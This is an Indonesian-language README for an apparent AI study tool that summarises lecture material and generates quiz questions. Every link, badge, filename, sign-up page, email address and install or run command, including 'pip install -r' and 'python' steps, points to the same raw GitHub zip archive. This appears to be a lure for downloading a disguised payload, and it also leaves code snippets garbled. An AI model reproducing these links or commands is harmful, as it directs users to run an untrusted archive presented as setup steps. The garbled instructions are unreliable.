# 📚 Sistem Analisis dan Penyederhanaan Materi Kuliah

> **Sistem berbasis AI untuk menganalisis, menyederhanakan, dan memahami materi kuliah dengan lebih efektif**

[![Python Version](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip+https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)
[![Gradio](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip+https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)
[![OpenAI](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)
[![License](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)](LICENSE)

## ✨ Fitur Utama

### 📖 Analisis Materi
- **Ringkasan Komprehensif**: Overview lengkap materi dalam format terstruktur
- **Ekstrak Poin Penting**: Identifikasi konsep kunci dan definisi penting
- **Penjelasan Sederhana**: Simplifikasi materi kompleks dengan bahasa mudah
- **Q&A Generator**: Buat 10 pertanyaan & jawaban untuk review

### ⚖️ Perbandingan Materi
- Analisis komparatif dua materi berbeda
- Identifikasi persamaan dan perbedaan
- Evaluasi kelebihan dan kekurangan
- Rekomendasi penggunaan

### ✍️ Generator Soal Latihan
- Generate 3-20 soal pilihan ganda
- 3 tingkat kesulitan (Mudah, Menengah, Sulit)
- Lengkap dengan jawaban dan penjelasan
- Format siap digunakan untuk latihan

### 💬 Chat AI Assistant (NEW!)
- Tanya jawab interaktif dengan AI
- Diskusi konsep secara mendalam
- Minta penjelasan tambahan
- Konsultasi strategi belajar

### 💾 Export & Save
- Export hasil ke TXT format
- Simpan untuk referensi offline
- Auto-timestamp pada filename

## 🚀 Quick Start

### Prerequisites
```bash
Python 3.9 atau lebih tinggi
pip (Python package manager)
OpenAI API Key
```

### Installation

1. **Clone atau Download Project**
```bash
git clone <repository-url>
cd analisis-materi-kuliah
```

2. **Buat Virtual Environment**
```bash
python -m venv venv

# Windows
venv\Scripts\activate

# Linux/Mac
source venv/bin/activate
```

3. **Install Dependencies**
```bash
pip install -r https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
```

4. **Setup API Key**

Buat file `.env` di root folder:
```env
OPENAI_API_KEY=sk-proj-your-api-key-here
```

**Cara mendapatkan API Key:**
- Kunjungi: https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
- Login/Register
- Create new API key
- Copy dan paste ke `.env`

5. **Test Configuration**
```bash
python https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
```

6. **Run Application**
```bash
python https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
```

Aplikasi akan berjalan di: `http://localhost:7860`

## 📁 Struktur Project

```
analisis-materi-kuliah/
│
├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                          # Aplikasi Gradio utama
├── .env                            # API keys (jangan commit!)
├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                # Dependencies
├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                    # Script test API
├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                     # Unit tests
│
├── utils/
│   ├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
│   ├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip             # Handler OpenAI API
│   ├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip          # Processor file & text
│   └── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip       # Fitur tambahan
│
└── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                       # Dokumentasi ini
```

## 💡 Cara Penggunaan

### 1. Analisis Materi

**Step 1:** Upload file (PDF/DOCX/TXT) atau paste teks
```
Minimum: 50 karakter
Recommended: 200+ kata untuk hasil optimal
```

**Step 2:** Pilih jenis analisis
- Ringkasan → Quick overview
- Poin Penting → Key concepts
- Penjelasan Sederhana → Simplified version
- Q&A → Study questions

**Step 3:** Klik "🚀 Mulai Analisis"

**Step 4:** Export hasil (opsional)

### 2. Perbandingan Materi

**Use Case:** Membandingkan:
- Dua metode pembelajaran
- Teori lama vs baru
- Pendekatan berbeda
- Materi dari sumber berbeda

**Step 1:** Input materi pertama
**Step 2:** Input materi kedua
**Step 3:** Klik "⚖️ Bandingkan Sekarang"

### 3. Generator Soal

**Step 1:** Input materi
**Step 2:** Pilih jumlah soal (3-20)
**Step 3:** Pilih tingkat kesulitan
**Step 4:** Generate!

**Output:** Soal pilihan ganda dengan 4 opsi + jawaban + penjelasan

### 4. Chat Assistant

**Use Case:**
- "Jelaskan konsep X dengan analogi"
- "Apa perbedaan A dan B?"
- "Bagaimana cara memahami materi Y?"
- "Buatkan contoh kasus untuk konsep Z"

## ⚙️ Konfigurasi

### Pilih Model OpenAI

Edit `https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip`:

```python
class LLMHandler:
    def __init__(self):
        https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip = "gpt-4o-mini"  # Ganti di sini
```

**Pilihan Model:**

| Model | Kecepatan | Biaya | Kualitas | Use Case |
|-------|-----------|-------|----------|----------|
| gpt-4o-mini | ⚡⚡⚡ | 💰 | ⭐⭐⭐⭐ | **Recommended** |
| gpt-4o | ⚡⚡ | 💰💰💰 | ⭐⭐⭐⭐⭐ | Premium quality |
| gpt-3.5-turbo | ⚡⚡⚡ | 💰 | ⭐⭐⭐ | Budget friendly |

### Estimasi Biaya (GPT-4o-mini)

- Input: $0.150 per 1M tokens
- Output: $0.600 per 1M tokens
- **Rata-rata 1 analisis: $0.001 - $0.005** (sangat murah!)

## 🎨 Fitur UI/UX

### Modern Design
- ✨ Gradient color scheme
- 🎯 Clean and intuitive interface
- 📱 Responsive layout
- 🌈 Beautiful tab navigation

### Progress Indicators
- Real-time processing status
- Step-by-step feedback
- Completion notifications

### Smart Features
- Auto word count
- Processing time estimation
- File size validation
- Error handling & user feedback

## 🔧 Troubleshooting

### Error: "Invalid API Key"
**Solusi:**
1. Periksa file `.env` sudah ada
2. Pastikan format: `OPENAI_API_KEY=sk-proj-...`
3. Tidak ada spasi atau quotes
4. API key valid dan aktif

### Error: "Insufficient Credits"
**Solusi:**
1. Cek billing: https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
2. Tambah payment method
3. Top up credits

### Error: "File cannot be read"
**Solusi:**
1. Pastikan file tidak corrupt
2. Format didukung: PDF, DOCX, TXT
3. File tidak password-protected
4. Ukuran file < 10MB

### Slow Processing
**Tips:**
- Gunakan materi tidak terlalu panjang (< 5000 kata)
- Pilih model lebih cepat (gpt-4o-mini)
- Check koneksi internet
- Tunggu 10-30 detik untuk response

## 🚀 Advanced Usage

### Batch Processing
```python
# Process multiple files
files = ["https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip", "https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip", "https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip"]
for file in files:
    result = https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip(file, "ringkasan")
    save_result(result)
```

### Custom Prompts
Edit prompts di `https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip` untuk customize output style.

### Integration dengan Tools Lain
- Export ke Notion
- Sync dengan Google Docs
- Share via Telegram Bot
- Auto-post ke Discord

## 📊 Roadmap

### Version 2.1 (Planned)
- [ ] Multi-language support (English, etc)
- [ ] Voice input/output
- [ ] Diagram & mindmap generator
- [ ] Video transcript analysis
- [ ] Collaborative features

### Version 2.5 (Future)
- [ ] Mobile app
- [ ] Browser extension
- [ ] Integration dengan LMS
- [ ] Offline mode dengan local LLM

## 🤝 Contributing

Kontribusi sangat welcome! 

1. Fork repository
2. Create feature branch
3. Commit changes
4. Push to branch
5. Create Pull Request

## 📝 License

MIT License - lihat file LICENSE untuk detail

## 👨‍💻 Support

Jika ada pertanyaan atau issues:
- Open GitHub Issue
- Email: https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
- Discord: your-discord

## 🙏 Credits

- **AI Model**: OpenAI GPT-4
- **Framework**: Gradio
- **Libraries**: PyPDF2, python-docx, python-dotenv
- **Inspiration**: Mahasiswa Indonesia yang ingin belajar lebih efektif

## 📈 Stats

- ⭐ Stars: 0 (Be the first!)
- 🍴 Forks: 0
- 🐛 Issues: 0
- 📦 Version: 2.0

---

<div align="center">

**Dibuat dengan ❤️ untuk Mahasiswa Indonesia**

[⬆ Back to Top](#-sistem-analisis-dan-penyederhanaan-materi-kuliah)

</div>